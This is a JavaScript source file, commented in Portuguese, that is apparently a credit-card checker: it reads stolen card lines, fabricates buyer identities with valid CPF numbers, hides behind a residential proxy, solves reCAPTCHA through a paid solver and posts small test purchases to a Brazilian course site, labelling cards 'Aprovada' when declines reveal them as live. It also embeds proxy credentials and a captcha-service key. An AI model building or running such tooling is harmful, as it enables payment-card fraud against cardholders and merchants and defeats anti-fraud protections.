import axios from 'axios';
import fs from 'fs';
import chalk from 'chalk';
import { HttpsProxyAgent } from 'https-proxy-agent';
import randomUseragent from 'random-useragent';
import cheerio from 'cheerio';
import { faker } from '@faker-js/faker'; // Biblioteca atualizada para gerar dados falsos
import cpf from 'cpf';                  // Biblioteca para gerar CPFs válidos

// Função para gerar um nome completo aleatório
function gerarNomeCompleto() {
    const primeiroNome = faker.person.firstName();
    const sobrenome = faker.person.lastName();
    return `${primeiroNome} ${sobrenome}`;
}

// Função para gerar um e-mail aleatório
function gerarEmail(nomeCompleto) {
    const nomePartes = nomeCompleto.toLowerCase().split(' ');
    const email = `${nomePartes[0]}.${nomePartes[1]}@exemplo.com`;
    return email;
}

// Função para gerar um CPF aleatório válido
function gerarCPF() {
    return cpf.generate().replace(/[.-]/g, '');  // Gera um CPF válido
}

// Função para gerar um número de telefone aleatório
function gerarTelefone() {
    const ddd = faker.number.int({ min: 11, max: 99 }); // DDD aleatório
    const numero = faker.phone.number('9####-####');    // Formato de celular
    return `(${ddd}) ${numero}`;
}

// Função para gerar todas as informações
function gerarInformacoes() {
    const nomeCompleto = gerarNomeCompleto();
    const email = gerarEmail(nomeCompleto);
    const documentoCPF = gerarCPF();
    const telefone = gerarTelefone();

    return {
        nome: nomeCompleto,
        email: email,
        cpf: documentoCPF,
        telefone: telefone
    };
}

// Gerar e exibir informações
const dadosGerados = gerarInformacoes();
//console.log(dadosGerados);
// Configuração do proxy
const proxyConfig = {
    protocol: 'http',
    host: 'rp.proxyscrape.com',
    port: 6060,
    auth: {
        username: 'jpn645m14q0pkq9-country-br',
        password: '1witm204vszvwdv'
    }
};
const proxyAgent = new HttpsProxyAgent(`http://${proxyConfig.auth.username}:${proxyConfig.auth.password}@${proxyConfig.host}:${proxyConfig.port}`);


async function solveCaptcha() {
    // Define o payload para a requisição inicial
    const payload = {
        "clientKey": "733c7653b216ab6f1d9b0537fd56431f", // Usando a api_key passada como argumento
        "task": {
            "type": "NoCaptchaTaskProxyless",
            "websiteURL": 'https://app.t2.com.br/courseOffers/131', // Usando a URL passada como argumento
            "websiteKey": '6Lejd2QqAAAAANuG-z7MA6EgIw6aBHYWyUAgSAHb'  // Usando o site_key passado como argumento
        }
    };

    try {
        // Envia a requisição POST para o CapMonster
        const response = await axios.post("https://api.capmonster.cloud/createTask", payload);
        const responseData = response.data;

        //   console.log(responseData.data);

        // Verifica se a requisição foi bem-sucedida
        if (responseData.errorId === 0) {
            const task_id = responseData.taskId;
            const timeout = Date.now() + 240000; // 240 segundos (4 minutos)

            // Loop para verificar o status da resolução do CAPTCHA
            while (Date.now() < timeout) {
                await new Promise(resolve => setTimeout(resolve, 5000)); // Aguarda 5 segundos

                //   console.log(api_key)
                const resultResponse = await axios.post("https://api.capmonster.cloud/getTaskResult", {
                    clientKey: '733c7653b216ab6f1d9b0537fd56431f',
                    taskId: task_id
                });
                const resultData = resultResponse.data;

                // console.log(resultData);

                // Verifica o status da resposta
                if (resultData.status === "ready") {
                    return resultData.solution.gRecaptchaResponse;
                } else if (resultData.errorId !== 0) {
                    console.error("Erro ao resolver o CAPTCHA:", resultData.errorDescription);
                    return null;
                }
            }
        } else {
            console.error("Erro ao criar tarefa:", responseData.errorDescription);
        }
    } catch (error) {
        console.error("Erro:", error.message || error);
    }

    return null;
}

// Exemplo de uso

// Função de compra
async function makePurchase(numberGG, monthGG, yearGG, cvvGG) {
    const startTime = Date.now();  // Captura o tempo de início
    const userAgent = randomUseragent.getRandom();
    let resolverCaptchaToken = await solveCaptcha();
    // console.log(resolverCaptchaToken)
    try {

        //console.log(`Tempo de requisição: ${durationInSeconds.toFixed(2)} segundos`);

        const response = await axios.get('https://app.t2.com.br/courseOffers/131', {
            headers: {
                'Host': 'app.t2.com.br',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Referer': 'https://t2.com.br/',
                'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
            },
            httpsAgent: proxyAgent
        });

        const html = response.data;
        const $ = cheerio.load(html);
        const csrfToken = $('meta[name="csrf-token"]').attr('content');
        //  console.log(csrfToken);

        if (!csrfToken) {
            return console.log('request off -1')
        }

        //  console.log(resolverCaptchaToken)

        const purchaseResponse = await axios.post(
            'https://cursos.t2.com.br/api/v1/payments',
            {
                'installment_count': 1,
                'billing_type': 'CREDIT_CARD',
                "recaptcha_token": resolverCaptchaToken,
                'customer_data': {
                    'cpf_cnpj': dadosGerados.cpf,
                    'address_number': '34',
                    'postal_code': '09890300',
                    'street': 'Rua Doutor Cincinato Braga',
                    'neighborhood': 'Planalto',
                    'state_id': 1,
                    'city_id': 80,
                    'name': dadosGerados.nome,
                    'email': dadosGerados.email,
                    'phone': '91984155843',
                    'phone_country_code_id': 31
                },
                'credit_card': {
                    'number': numberGG,
                    'holder_name': dadosGerados.nome,
                    'cvv': cvvGG,
                    'expiry_month': monthGG,
                    'expiry_year': `20${yearGG}`
                },
                'course_offer_id': 12
            },
            {
                headers: {
                    'Host': 'cursos.t2.com.br',
                    'sec-ch-ua-platform': '"Windows"',
                    'X-CSRF-Token': csrfToken,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                    'Accept': 'application/json',
                    'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                    'Content-Type': 'application/json',
                    'sec-ch-ua-mobile': '?0',
                    'Origin': 'https://app.t2.com.br',
                    'Referer': 'https://app.t2.com.br/',
                    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                },
                httpsAgent: proxyAgent
            }
        );


        console.log(purchaseResponse.data)

        if (purchaseResponse.data.data.status == 'paid') {
            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 000|Pagamento Realizado R$20,00 💸 |[@loficenter] `));
        }

    } catch (error) {
         console.log(error)
        if (!error.response) {
            console.log(chalk.red(`[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1011|Número do cartão inválido - [@loficenter]`))
            return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1011|Número do cartão inválido - [@loficenter]`
        }
        let responseError = error.response.data.errors[0];
        //console.log(responseError)

        if (responseError.includes('Código de segurança inválido')) {
            return console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1045|${responseError} | [@loficenter] `));
        }
        else if (responseError.includes('Saldo insuficiente')) {
            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${responseError} 💸| [@loficenter]`));
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${responseError} 💸| [@loficenter]`
        } else if (responseError.includes('Transação não autorizada por violação de segurança')) {
            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1022|Transação não autorizada por violação de segurança 💸| [@loficenter]`));
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1022|Transação não autorizada por violação de segurança 💸| [@loficenter]`
        } else if (responseError.includes('aprovada')) {
            console.log(chalk.green(`[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 0000|Transação aprovada1 💸| [@loficenter]`));
            return `[Aprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 0000|Transação aprovada1 💸| [@loficenter]`
        } else if (responseError.includes('Número do cartão inválido')) {
            console.log(chalk.red(`[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1011|Número do cartão inválido | [@loficenter]`));
            return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - 1011|Número do cartão inválido | [@loficenter]`
        } else {
            console.log(chalk.red(`[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${responseError} - [@loficenter]`));
            return `[Reprovada] ${numberGG}|${monthGG}|20${yearGG}|${cvvGG} Retorno - ${responseError} - [@loficenter]`
        }
    }
}


async function executeFlow(value) {
    try {

        // const uniqueList = [...new Set(list)];

        //   for (let value of uniqueList) {

        const [numberGG, monthGG, yearGG, cvvGG] = value.split('|');
        const yearSplited = yearGG.split('20')[1];
        // console.log(numberGG,monthGG,yearSplited,cvvGG)

        try {
            let respoonse = await makePurchase(numberGG, monthGG, yearSplited, cvvGG);
            return respoonse
        } catch (purchaseError) {
            console.error('Erro ao realizar a compra:', purchaseError.message);
        }

        //  }

    } catch (error) {
        console.error('Erro no fluxo principal:', error.message);
    }
}

export default executeFlow